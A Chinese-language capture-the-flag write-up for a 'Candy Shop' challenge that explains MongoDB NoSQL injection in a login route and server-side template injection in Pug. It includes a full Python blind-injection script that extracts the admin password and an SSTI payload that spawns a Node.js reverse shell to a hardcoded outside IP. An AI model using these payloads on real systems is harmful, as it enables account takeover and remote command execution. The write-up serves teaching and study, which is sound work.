## Candy Shop

**题目难度: Easy**

**知识点: NoSQL注入(mongodb) / pug SSTI**

**题目提供Dockefile下载**

商店可以注册和登录 但是新注册的账号都是没有激活的 2333

```javascript
static add = async (username, password, active) => {
    let user = {
        username: username,
        password: password,
        active: active
    }
    let client = await connect()
    await client.db('test').collection('users').insertOne(user)
}
```

翻源码可以看到有一个激活的账号 但是你不知道密码>_<

```javascript
let users = client.db('test').collection('users')
users.deleteMany(err => {
    if (err) {
        console.log(err)
    } else {
        users.insertOne({
            username: 'rabbit',
            password: process.env.PASSWORD,
            active: true
        })
    }
})
```

/login路由留了一个NoSQL注入

```javascript
router.post('/login', async (req, res) => {
    let {username, password} = req.body
    // 平平无奇的NoSQL注入
    let rec = await db.Users.find({username: username, password: password})
    if (rec) {
        // 这里算是一个提示
        if (rec.username === username && rec.password === password) {
            res.cookie('token', rec, {signed: true})
            res.redirect('/shop')
        } else {
            res.render('login', {error: 'You Bad Bad >_<'})
        }
    } else {
        res.render('login', {error: 'Login Failed!'})
    }
})
```

可以通过两个不同回显来盲注出密码

exp

```python
import requests
from urllib.parse import quote

url = 'http://localhost:3000/user/login'

result = ''
for i in range(1, 50):
	ascii_min = 0
	ascii_max = 128
	while ascii_max - ascii_min > 1:
		mid = (ascii_min + ascii_max) // 2
		data = 'username=rabbit&password[$lt]=' + quote(result + chr(mid))
		r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
		if 'Bad' in r.text:
			ascii_max = mid
		else:
			ascii_min = mid
		print(ascii_min, ascii_max, mid)
	if ascii_min == 0:
		break
	result += chr(ascii_min)
	print(result)

print(result)
```

进入商店后

确认订单界面留了一个明显的SSTI 

```javascript
router.post('/order', checkLogin, checkActive, async (req, res) => {
    let {user_name, candy_name, address} = req.body

    res.render('confirm', {
        user_name: user_name,
        candy_name: candy_name,
        address: pug.render(address)
    })
})
```

模板引擎是pug

参考

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/

payload (因为环境没有bash 所以用node反弹shell 2333)

```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('echo \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(7777, "8.135.15.73", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'|node -')}()}
```

